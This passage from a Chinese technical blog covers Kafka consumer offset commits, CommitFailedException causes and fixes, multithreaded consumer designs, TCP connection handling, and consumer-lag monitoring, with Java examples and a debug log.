<h4 id="结合同步异步"><a href="#结合同步异步" class="headerlink" title="结合同步异步"></a>结合同步异步</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">    ConsumerRecords&lt;String, String&gt; records = </span><br><span class="line">      consumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line">    process(records); <span class="comment">// 处理消息</span></span><br><span class="line">    commitAysnc(); <span class="comment">// 使用异步提交规避阻塞</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">  handle(e); <span class="comment">// 处理异常</span></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    consumer.commitSync(); <span class="comment">// 最后一次提交使用同步阻塞式提交</span></span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    consumer.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于常规性、阶段性的手动提交，我们调用 commitAsync() 避免程序阻塞，而在 Consumer 要关闭前，我们调用 commitSync() 方法执行同步阻塞式的位移提交，以确保 Consumer 关闭前能够保存正确的位移数据。</p>
<h4 id="细化提交信息粒度"><a href="#细化提交信息粒度" class="headerlink" title="细化提交信息粒度"></a>细化提交信息粒度</h4><p>你的 poll 方法返回的不是 500 条消息，而是 5000 条。那么，你肯定不想把这 5000 条消息都处理完之后再提交位移，因为一旦中间出现差错，之前处理的全部都要重来一遍。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Map&lt;TopicPartition, OffsetAndMetadata&gt; offsets = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">……</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            ConsumerRecords&lt;String, String&gt; records = </span><br><span class="line">  consumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line">            <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; record: records) &#123;</span><br><span class="line">                        process(record);  <span class="comment">// 处理消息</span></span><br><span class="line">                        offsets.put(<span class="keyword">new</span> TopicPartition(record.topic(), record.partition()),</span><br><span class="line">                                   <span class="keyword">new</span> OffsetAndMetadata(record.offset() + <span class="number">1</span>)；</span><br><span class="line">                       <span class="keyword">if</span>（count % <span class="number">100</span> == <span class="number">0</span>）</span><br><span class="line">                                    consumer.commitAsync(offsets, <span class="keyword">null</span>); <span class="comment">// 回调处理逻辑是null</span></span><br><span class="line">                        count++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CommitFailedException异常怎么处理？"><a href="#CommitFailedException异常怎么处理？" class="headerlink" title="CommitFailedException异常怎么处理？"></a>CommitFailedException异常怎么处理？</h3><p>所谓 CommitFailedException，顾名思义就是 Consumer 客户端在提交位移时出现了错误或异常，而且还是那种不可恢复的严重异常。如果异常是可恢复的瞬时错误，提交位移的 API 自己就能规避它们了，因为很多提交位移的 API 方法是支持自动错误重试的，比如我们在上一期中提到的 commitSync 方法。</p>
<p>看看社区对这个异常的最新解释：</p>
<blockquote>
<p>Commit cannot be completed since the group has already rebalanced and assigned the partitions to another member. This means that the time between subsequent calls to poll() was longer than the configured max.poll.interval.ms, which typically implies that the poll loop is spending too much time message processing. You can address this either by increasing max.poll.interval.ms or by reducing the maximum size of batches returned in poll() with max.poll.records.</p>
</blockquote>
<p>这段话前半部分的意思是，本次提交位移失败了，原因是消费者组已经开启了 Rebalance 过程，并且将要提交位移的分区分配给了另一个消费者实例。出现这个情况的原因是，你的消费者实例连续两次调用 poll 方法的时间间隔超过了期望的 max.poll.interval.ms 参数值。这通常表明，你的消费者实例花费了太长的时间进行消息处理，耽误了调用 poll 方法。</p>
<p>在后半部分，社区给出了两个相应的解决办法：</p>
<ul>
<li>增加期望的时间间隔 max.poll.interval.ms 参数值。</li>
<li>减少 poll 方法一次性返回的消息数量，即减少 max.poll.records 参数值。</li>
</ul>
<h4 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h4><p>我们先说说最常见的场景。当消息处理的总时间超过预设的 max.poll.interval.ms 参数值时，Kafka Consumer 端会抛出 CommitFailedException 异常。这是该异常最“正宗”的登场方式。你只需要写一个 Consumer 程序，使用 KafkaConsumer.subscribe 方法随意订阅一个主题，之后设置 Consumer 端参数 max.poll.interval.ms=5 秒，最后在循环调用 KafkaConsumer.poll 方法之间，插入 Thread.sleep(6000) 和手动提交位移，就可以成功复现这个异常了。在这里，我展示一下主要的代码逻辑。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">…</span><br><span class="line">Properties props = <span class="keyword">new</span> Properties();</span><br><span class="line">…</span><br><span class="line">props.put(<span class="string">&quot;max.poll.interval.ms&quot;</span>, <span class="number">5000</span>);</span><br><span class="line">consumer.subscribe(Arrays.asList(<span class="string">&quot;test-topic&quot;</span>));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">    ConsumerRecords&lt;String, String&gt; records = </span><br><span class="line">    consumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line">    <span class="comment">// 使用Thread.sleep模拟真实的消息处理逻辑</span></span><br><span class="line">    Thread.sleep(<span class="number">6000L</span>);</span><br><span class="line">    consumer.commitSync();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体来说有 4 种方法:</p>
<ul>
<li>缩短单条消息处理的时间。比如，之前下游系统消费一条消息的时间是 100 毫秒，优化之后成功地下降到 50 毫秒，那么此时 Consumer 端的 TPS 就提升了一倍。</li>
<li>增加 Consumer 端允许下游系统消费一批消息的最大时长。这取决于 Consumer 端参数 max.poll.interval.ms 的值。在最新版的 Kafka 中，该参数的默认值是 5 分钟。如果你的消费逻辑不能简化，那么提高该参数值是一个不错的办法。</li>
<li>减少下游系统一次性消费的消息总数。这取决于 Consumer 端参数 max.poll.records 的值。当前该参数的默认值是 500 条，表明调用一次 KafkaConsumer.poll 方法，最多返回 500 条消息。</li>
<li>下游系统使用多线程来加速消费。这应该算是“最高级”同时也是最难实现的解决办法了。具体的思路就是，让下游系统手动创建多个消费线程处理 poll 方法返回的一批消息。之前你使用 Kafka Consumer 消费数据更多是单线程的，所以当消费速度无法匹及 Kafka Consumer 消息返回的速度时，它就会抛出 CommitFailedException 异常。</li>
</ul>
<h4 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h4><p>如果你的应用中同时出现了设置相同 group.id 值的消费者组程序和独立消费者程序，那么当独立消费者程序手动提交位移时，Kafka 就会立即抛出 CommitFailedException 异常，因为 Kafka 无法识别这个具有相同 group.id 的消费者实例，于是就向它返回一个错误，表明它不是消费者组内合法的成员。</p>
<h3 id="多线程开发消费者实例"><a href="#多线程开发消费者实例" class="headerlink" title="多线程开发消费者实例"></a>多线程开发消费者实例</h3><h4 id="Kafka-Java-Consumer-设计原理"><a href="#Kafka-Java-Consumer-设计原理" class="headerlink" title="Kafka Java Consumer 设计原理"></a>Kafka Java Consumer 设计原理</h4><p>在开始探究之前，我先简单阐述下 Kafka Java Consumer 为什么采用单线程的设计。了解了这一点，对我们后面制定多线程方案大有裨益。</p>
<p>从 Kafka 0.10.1.0 版本开始，KafkaConsumer 就变为了双线程的设计，即用户主线程和心跳线程。</p>
<p>所谓用户主线程，就是你启动 Consumer 应用程序 main 方法的那个线程，而新引入的心跳线程（Heartbeat Thread）只负责定期给对应的 Broker 机器发送心跳请求，以标识消费者应用的存活性（liveness）。引入这个心跳线程还有一个目的，那就是期望它能将心跳频率与主线程调用 KafkaConsumer.poll 方法的频率分开，从而解耦真实的消息处理逻辑与消费者组成员存活性管理。</p>
<p>不过，虽然有心跳线程，但实际的消息获取逻辑依然是在用户主线程中完成的。因此，在消费消息的这个层面上，我们依然可以安全地认为 KafkaConsumer 是单线程的设计。</p>
<h4 id="多线程方案"><a href="#多线程方案" class="headerlink" title="多线程方案"></a>多线程方案</h4><p>首先，我们要明确的是，KafkaConsumer 类不是线程安全的 (thread-safe)。所有的网络 I/O 处理都是发生在用户主线程中，因此，你在使用过程中必须要确保线程安全。简单来说，就是你不能在多个线程中共享同一个 KafkaConsumer 实例，否则程序会抛出 ConcurrentModificationException 异常。</p>
<p>当然了，这也不是绝对的。KafkaConsumer 中有个方法是例外的，它就是 wakeup()，你可以在其他线程中安全地调用 KafkaConsumer.wakeup() 来唤醒 Consumer。</p>
<p>鉴于 KafkaConsumer 不是线程安全的事实，我们能够制定两套多线程方案。</p>
<h5 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h5><p>1.消费者程序启动多个线程，每个线程维护专属的 KafkaConsumer 实例，负责完整的消息获取、消息处理流程。如下图所示：</p>
<p><img src="https://static001.geekbang.org/resource/image/d9/40/d921a79085ef214byy50d7f94cde7a40.jpg"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KafkaConsumerRunner</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">final</span> AtomicBoolean closed = <span class="keyword">new</span> AtomicBoolean(<span class="keyword">false</span>);</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">final</span> KafkaConsumer consumer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             consumer.subscribe(Arrays.asList(<span class="string">&quot;topic&quot;</span>));</span><br><span class="line">             <span class="keyword">while</span> (!closed.get()) &#123;</span><br><span class="line">      ConsumerRecords records = </span><br><span class="line">        consumer.poll(Duration.ofMillis(<span class="number">10000</span>));</span><br><span class="line">                 <span class="comment">//  执行消息处理逻辑</span></span><br><span class="line">             &#125;</span><br><span class="line">         &#125; <span class="keyword">catch</span> (WakeupException e) &#123;</span><br><span class="line">             <span class="comment">// Ignore exception if closing</span></span><br><span class="line">             <span class="keyword">if</span> (!closed.get()) <span class="keyword">throw</span> e;</span><br><span class="line">         &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">             consumer.close();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="comment">// Shutdown hook which can be called from a separate thread</span></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shutdown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         closed.set(<span class="keyword">true</span>);</span><br><span class="line">         consumer.wakeup();</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>这段代码创建了一个 Runnable 类，表示执行消费获取和消费处理的逻辑。每个 KafkaConsumerRunner 类都会创建一个专属的 KafkaConsumer 实例。在实际应用中，你可以创建多个 KafkaConsumerRunner 实例，并依次执行启动它们，以实现方案 1 的多线程架构。</p>
<h5 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h5><p>2.消费者程序使用单或多线程获取消息，同时创建多个消费线程执行消息处理逻辑。获取消息的线程可以是一个，也可以是多个，每个线程维护专属的 KafkaConsumer 实例，处理消息则交由特定的线程池来做，从而实现消息获取与消息处理的真正解耦。具体架构如下图所示：</p>
<p><img src="https://static001.geekbang.org/resource/image/02/bb/02b7945cab3c2a574d8a49e1a9927dbb.jpg"></p>
<p>因为该方案将消息获取和消息处理分开了，也就是说获取某条消息的线程不是处理该消息的线程，因此无法保证分区内的消费顺序。举个例子，比如在某个分区中，消息 1 在消息 2 之前被保存，那么 Consumer 获取消息的顺序必然是消息 1 在前，消息 2 在后，但是，后面的 Worker 线程却有可能先处理消息 2，再处理消息 1，这就破坏了消息在分区中的顺序。还是那句话，如果你在意 Kafka 中消息的先后顺序，方案 2 的这个劣势是致命的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> KafkaConsumer&lt;String, String&gt; consumer;</span><br><span class="line"><span class="keyword">private</span> ExecutorService executors;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> workerNum = ...;</span><br><span class="line">executors = <span class="keyword">new</span> ThreadPoolExecutor(</span><br><span class="line">  workerNum, workerNum, <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">  <span class="keyword">new</span> ArrayBlockingQueue&lt;&gt;(<span class="number">1000</span>), </span><br><span class="line">  <span class="keyword">new</span> ThreadPoolExecutor.CallerRunsPolicy());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>)  &#123;</span><br><span class="line">  ConsumerRecords&lt;String, String&gt; records = </span><br><span class="line">    consumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">final</span> ConsumerRecord record : records) &#123;</span><br><span class="line">    executors.submit(<span class="keyword">new</span> Worker(record));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">..</span><br></pre></td></tr></table></figure>

<p>这段代码最重要的地方是最后一行：当 Consumer 的 poll 方法返回消息后，由专门的线程池来负责处理具体的消息。调用 poll 方法的主线程不负责消息处理逻辑，这样就实现了方案 2 的多线程架构。</p>
<p>ThreadPoolExecutor的构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ThreadPoolExecutor</span><span class="params">(<span class="keyword">int</span> corePoolSize, // 指定了线程池中的线程数量，它的数量决定了添加的任务是开辟新的线程去执行，还是放到workQueue任务队列中去；</span></span></span><br><span class="line"><span class="params"><span class="function">                          <span class="keyword">int</span> maximumPoolSize, // 指定了线程池中的最大线程数量，这个参数会根据你使用的workQueue任务队列的类型，决定线程池会开辟的最大线程数量；</span></span></span><br><span class="line"><span class="params"><span class="function">                          <span class="keyword">long</span> keepAliveTime, // 当线程池中空闲线程数量超过corePoolSize时，多余的线程会在多长时间内被销毁；</span></span></span><br><span class="line"><span class="params"><span class="function">                          TimeUnit unit, // keepAliveTime的单位</span></span></span><br><span class="line"><span class="params"><span class="function">                          BlockingQueue&lt;Runnable&gt; workQueue, // 任务队列，被添加到线程池中，但尚未被执行的任务；它一般分为直接提交队列、有界任务队列、无界任务队列、优先任务队列几种；</span></span></span><br><span class="line"><span class="params"><span class="function">                          ThreadFactory threadFactory, // 线程工厂，用于创建线程，一般用默认即可；</span></span></span><br><span class="line"><span class="params"><span class="function">                          RejectedExecutionHandler handler // 拒绝策略；当任务太多来不及处理时，如何拒绝任务；</span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (corePoolSize &lt; <span class="number">0</span> ||</span><br><span class="line">      maximumPoolSize &lt;= <span class="number">0</span> ||</span><br><span class="line">      maximumPoolSize &lt; corePoolSize ||</span><br><span class="line">      keepAliveTime &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">  <span class="keyword">if</span> (workQueue == <span class="keyword">null</span> || threadFactory == <span class="keyword">null</span> || handler == <span class="keyword">null</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">  <span class="keyword">this</span>.acc = System.getSecurityManager() == <span class="keyword">null</span> ?</span><br><span class="line">    <span class="keyword">null</span> :</span><br><span class="line">  AccessController.getContext();</span><br><span class="line">  <span class="keyword">this</span>.corePoolSize = corePoolSize;</span><br><span class="line">  <span class="keyword">this</span>.maximumPoolSize = maximumPoolSize;</span><br><span class="line">  <span class="keyword">this</span>.workQueue = workQueue;</span><br><span class="line">  <span class="keyword">this</span>.keepAliveTime = unit.toNanos(keepAliveTime);</span><br><span class="line">  <span class="keyword">this</span>.threadFactory = threadFactory;</span><br><span class="line">  <span class="keyword">this</span>.handler = handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h5><p>我们来打个比方。比如一个完整的消费者应用程序要做的事情是 1、2、3、4、5，那么方案 1 的思路是粗粒度化的工作划分，也就是说方案 1 会创建多个线程，每个线程完整地执行 1、2、3、4、5，以实现并行处理的目标，它不会进一步分割具体的子任务；而方案 2 则更细粒度化，它会将 1、2 分割出来，用单线程（也可以是多线程）来做，对于 3、4、5，则用另外的多个线程来做。</p>
<p>这两种方案孰优孰劣呢？应该说是各有千秋。我总结了一下这两种方案的优缺点，我们先来看看下面这张表格。</p>
<p><img src="https://static001.geekbang.org/resource/image/84/0c/84dc0edb73f203b55808b33ca004670c.jpg"></p>
<h3 id="Java-消费者是如何管理TCP连接的"><a href="#Java-消费者是如何管理TCP连接的" class="headerlink" title="Java 消费者是如何管理TCP连接的?"></a>Java 消费者是如何管理TCP连接的?</h3><p>我们先从消费者创建 TCP 连接开始讨论。消费者端主要的程序入口是 KafkaConsumer 类。和生产者不同的是，构建 KafkaConsumer 实例时是不会创建任何 TCP 连接的，也就是说，当你执行完 new KafkaConsumer(properties) 语句后，你会发现，没有 Socket 连接被创建出来。这一点和 Java 生产者是有区别的，主要原因就是生产者入口类 KafkaProducer 在构建实例的时候，会在后台默默地启动一个 Sender 线程，这个 Sender 线程负责 Socket 连接的创建。</p>
<h4 id="创建-TCP-连接"><a href="#创建-TCP-连接" class="headerlink" title="创建 TCP 连接"></a>创建 TCP 连接</h4><p>如果 Socket 不是在构造函数中创建的，那么是在 KafkaConsumer.subscribe 或 KafkaConsumer.assign 方法中创建的吗？严格来说也不是。我还是直接给出答案吧：TCP 连接是在调用 KafkaConsumer.poll 方法时被创建的。再细粒度地说，在 poll 方法内部有 3 个时机可以创建 TCP 连接。</p>
<ul>
<li>1.发起 FindCoordinator 请求时</li>
<li>2.连接协调者时</li>
<li>3.消费数据时：假设消费者要消费 5 个分区的数据，这 5 个分区各自的领导者副本分布在 4 台 Broker 上，那么该消费者在消费时会创建与这 4 台 Broker 的 Socket 连接。</li>
</ul>
<p>我们来看看这段日志。</p>
<blockquote>
<p>[2019-05-27 10:00:54,142] DEBUG [Consumer clientId=consumer-1, groupId=test] Initiating connection to node localhost:9092 (id: -1 rack: null) using address localhost/127.0.0.1 (org.apache.kafka.clients.NetworkClient:944)</p>
<p>…</p>
<p>[2019-05-27 10:00:54,188] DEBUG [Consumer clientId=consumer-1, groupId=test] Sending metadata request MetadataRequestData(topics=[MetadataRequestTopic(name=‘t4’)], allowAutoTopicCreation=true, includeClusterAuthorizedOperations=false, includeTopicAuthorizedOperations=false) to node localhost:9092 (id: -1 rack: null) (org.apache.kafka.clients.NetworkClient:1097)</p>
<p>…</p>
<p>[2019-05-27 10:00:54,188] TRACE [Consumer clientId=consumer-1, groupId=test] Sending FIND_COORDINATOR {key=test,key_type=0} with correlation id 0 to node -1 (org.apache.kafka.clients.NetworkClient:496)</p>
<p>[2019-05-27 10:00:54,203] TRACE [Consumer clientId=consumer-1, groupId=test] Completed receive from node -1 for FIND_COORDINATOR with correlation id 0, received {throttle_time_ms=0,error_code=0,error_message=null, node_id=2,host=localhost,port=9094} (org.apache.kafka.clients.NetworkClient:837)</p>
<p>…</p>
<p>[2019-05-27 10:00:54,204] DEBUG [Consumer clientId=consumer-1, groupId=test] Initiating connection to node localhost:9094 (id: 2147483645 rack: null) using address localhost/127.0.0.1 (org.apache.kafka.clients.NetworkClient:944)</p>
<p>…</p>
<p>[2019-05-27 10:00:54,237] DEBUG [Consumer clientId=consumer-1, groupId=test] Initiating connection to node localhost:9094 (id: 2 rack: null) using address localhost/127.0.0.1 (org.apache.kafka.clients.NetworkClient:944)</p>
<p>[2019-05-27 10:00:54,237] DEBUG [Consumer clientId=consumer-1, groupId=test] Initiating connection to node localhost:9092 (id: 0 rack: null) using address localhost/127.0.0.1 (org.apache.kafka.clients.NetworkClient:944)</p>
<p>[2019-05-27 10:00:54,238] DEBUG [Consumer clientId=consumer-1, groupId=test] Initiating connection to node localhost:9093 (id: 1 rack: null) using address localhost/127.0.0.1 (org.apache.kafka.clients.NetworkClient:944)</p>
</blockquote>
<p>这里我稍微解释一下，日志的第一行是消费者程序创建的第一个 TCP 连接，就像我们前面说的，这个 Socket 用于发送 FindCoordinator 请求。由于这是消费者程序创建的第一个连接，此时消费者对于要连接的 Kafka 集群一无所知，因此它连接的 Broker 节点的 ID 是 -1，表示消费者根本不知道要连接的 Kafka Broker 的任何信息。</p>
<p>值得注意的是日志的第二行，消费者复用了刚才创建的那个 Socket 连接，向 Kafka 集群发送元数据请求以获取整个集群的信息。</p>
<p>日志的第三行表明，消费者程序开始发送 FindCoordinator 请求给第一步中连接的 Broker，即 localhost:9092，也就是 nodeId 等于 -1 的那个。在十几毫秒之后，消费者程序成功地获悉协调者所在的 Broker 信息，也就是第四行标为橙色的“node_id = 2”。</p>
<p>完成这些之后，消费者就已经知道协调者 Broker 的连接信息了，因此在日志的第五行发起了第二个 Socket 连接，创建了连向 localhost:9094 的 TCP。只有连接了协调者，消费者进程才能正常地开启消费者组的各种功能以及后续的消息消费。</p>
<p>在日志的最后三行中，消费者又分别创建了新的 TCP 连接，主要用于实际的消息获取。还记得我刚才说的吗？要消费的分区的领导者副本在哪台 Broker 上，消费者就要创建连向哪台 Broker 的 TCP。在我举的这个例子中，localhost:9092，localhost:9093 和 localhost:9094 这 3 台 Broker 上都有要消费的分区，因此消费者创建了 3 个 TCP 连接。</p>
<p>看完这段日志，你应该会发现日志中的这些 Broker 节点的 ID 在不断变化。有时候是 -1，有时候是 2147483645，只有在最后的时候才回归正常值 0、1 和 2。这又是怎么回事呢？</p>
<p>前面我们说过了 -1 的来由，即消费者程序（其实也不光是消费者，生产者也是这样的机制）首次启动时，对 Kafka 集群一无所知，因此用 -1 来表示尚未获取到 Broker 数据。</p>
<p>那么 2147483645 是怎么来的呢？它是由 Integer.MAX_VALUE 减去协调者所在 Broker 的真实 ID 计算得来的。看第四行标为橙色的内容，我们可以知道协调者 ID 是 2，因此这个 Socket 连接的节点 ID 就是 Integer.MAX_VALUE 减去 2，即 2147483647 减去 2，也就是 2147483645。这种节点 ID 的标记方式是 Kafka 社区特意为之的结果，目的就是要让组协调请求和真正的数据获取请求使用不同的 Socket 连接。</p>
<p>至于后面的 0、1、2，那就很好解释了。它们表征了真实的 Broker ID，也就是我们在 server.properties 中配置的 broker.id 值。</p>
<p>消费者程序会创建 3 类 TCP 连接：</p>
<ul>
<li>确定协调者和获取集群元数据。</li>
<li>连接协调者，令其执行组成员管理操作。</li>
<li>执行实际的消息获取。</li>
</ul>
<h4 id="何时关闭-TCP-连接？"><a href="#何时关闭-TCP-连接？" class="headerlink" title="何时关闭 TCP 连接？"></a>何时关闭 TCP 连接？</h4><p>和生产者类似，消费者关闭 Socket 也分为主动关闭和 Kafka 自动关闭。主动关闭是指你显式地调用消费者 API 的方法去关闭消费者，具体方式就是手动调用 KafkaConsumer.close() 方法，或者是执行 Kill 命令，不论是 Kill -2 还是 Kill -9；而 Kafka 自动关闭是由消费者端参数 connection.max.idle.ms 控制的，该参数现在的默认值是 9 分钟，即如果某个 Socket 连接上连续 9 分钟都没有任何请求“过境”的话，那么消费者会强行“杀掉”这个 Socket 连接。</p>
<p>不过，和生产者有些不同的是，如果在编写消费者程序时，你使用了循环的方式来调用 poll 方法消费消息，那么上面提到的所有请求都会被定期发送到 Broker，因此这些 Socket 连接上总是能保证有请求在发送，从而也就实现了“长连接”的效果。</p>
<p>针对上面提到的三类 TCP 连接，你需要注意的是，当第三类 TCP 连接成功创建后，消费者程序就会废弃第一类 TCP 连接，之后在定期请求元数据时，它会改为使用第三类 TCP 连接。也就是说，最终你会发现，第一类 TCP 连接会在后台被默默地关闭掉。对一个运行了一段时间的消费者程序来说，只会有后面两类 TCP 连接存在。</p>
<h3 id="消费者组消费进度监控都怎么实现？"><a href="#消费者组消费进度监控都怎么实现？" class="headerlink" title="消费者组消费进度监控都怎么实现？"></a>消费者组消费进度监控都怎么实现？</h3><h4 id="1-为什么要监控"><a href="#1-为什么要监控" class="headerlink" title="1 为什么要监控"></a>1 为什么要监控</h4><p>A ：对于Kafka消费者，最重要的事情就是监控它们的消费进度（消费的滞后程度）常称为：Consumer Lag</p>
<p>B ：Lag的单位是消息数，他直接反映了一个消费者的运行情况。一个正常的消费者的Lag应当很小，设置为0。这表明消费者能够及时地消费生产者生产出来的消息。反之，一个消费者Lag值很大的话表明它无法跟上生产者的速度。</p>
<p>C ：如果消费者速度无法匹及生产者的数据，极有可能导致它消费的数据已经不在操作系统的页缓存中了，那些数据就失去了享有Zero Copy技术的条件，不得不从磁盘中读取，进一步拉大了与生产者的差距。并且会越来大。</p>
<p>所以：在实际业务场景中必须时刻关注消费者的消费进度。一旦出现Lag逐步增加的趋势，就要立即定位问题，及时处理，避免问题扩散。</p>
<h4 id="2-如何监控"><a href="#2-如何监控" class="headerlink" title="2 如何监控"></a>2 如何监控</h4><p>A ：使用Kafka自带的命令行工具kafka-consumer-groups脚本<br>B ：使用Kafka Java Conssumer API编程<br>C ：使用Kafka自带的JMX监控指标</p>
<h4 id="3-方法具体分析"><a href="#3-方法具体分析" class="headerlink" title="3 方法具体分析"></a>3 方法具体分析</h4><p>A ：Kafka自带命令<br>（1） kafka-consumer-groups脚本是kafka为我们提供的最直接的监控消费者消费进度工具。<br>（2） 使用：<br>$ bin/kafka-consumer-groups.sh –bootstrap-server &lt;Kafka broker连接信息 &gt; –describe –group &lt;group 名称 &gt;</p>
<p>&lt;Kafka broker 连接信息 &gt;：主机：端口<br>&lt;group 名称 &gt; ：要监控的消费组的 group.id值<br>（3）展示的信息：主题，分区，该消费者组最新消费消息的位移值（CURRENT-OFFSET值），每个分区当前最新生产的消息的位移值（LOG-END-OFFSET）,LAG（前两者的差值），消费者实例ID，消费者连接Broker的主机名以及消费者的CLENT-ID信息。</p>
<p>B ：Kafka Java Consumer API<br>（1）首先获取给定的消费者组的最新消费消息的位移<br>（2）在获取订阅分区的最新消息位移<br>（3）最后执行相应的减法操作，获取Lag值并封装进一个Map对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;TopicPartition, Long&gt; <span class="title">lagOf</span><span class="params">(String groupID, String bootstrapServers)</span> <span class="keyword">throws</span> TimeoutException </span>&#123;</span><br><span class="line">        Properties props = <span class="keyword">new</span> Properties();</span><br><span class="line">        props.put(CommonClientConfigs.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);</span><br><span class="line">        <span class="keyword">try</span> (AdminClient client = AdminClient.create(props)) &#123;</span><br><span class="line">            ListConsumerGroupOffsetsResult result = client.listConsumerGroupOffsets(groupID);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Map&lt;TopicPartition, OffsetAndMetadata&gt; consumedOffsets = result.partitionsToOffsetAndMetadata().get(<span class="number">10</span>, TimeUnit.SECONDS);</span><br><span class="line">                props.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, <span class="keyword">false</span>); <span class="comment">// 禁止自动提交位移</span></span><br><span class="line">                props.put(ConsumerConfig.GROUP_ID_CONFIG, groupID);</span><br><span class="line">                props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());</span><br><span class="line">                props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());</span><br><span class="line">                <span class="keyword">try</span> (<span class="keyword">final</span> KafkaConsumer&lt;String, String&gt; consumer = <span class="keyword">new</span> KafkaConsumer&lt;&gt;(props)) &#123;</span><br><span class="line">                    Map&lt;TopicPartition, Long&gt; endOffsets = consumer.endOffsets(consumedOffsets.keySet());</span><br><span class="line">                    <span class="keyword">return</span> endOffsets.entrySet().stream().collect(Collectors.toMap(entry -&gt; entry.getKey(),</span><br><span class="line">                            entry -&gt; entry.getValue() - consumedOffsets.get(entry.getKey()).offset()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                Thread.currentThread().interrupt();</span><br><span class="line">                <span class="comment">// 处理中断异常</span></span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">                <span class="keyword">return</span> Collections.emptyMap();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line">                <span class="comment">// 处理ExecutionException</span></span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">                <span class="keyword">return</span> Collections.emptyMap();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (TimeoutException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> TimeoutException(<span class="string">&quot;Timed out when getting lag for consumer group &quot;</span> + groupID);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

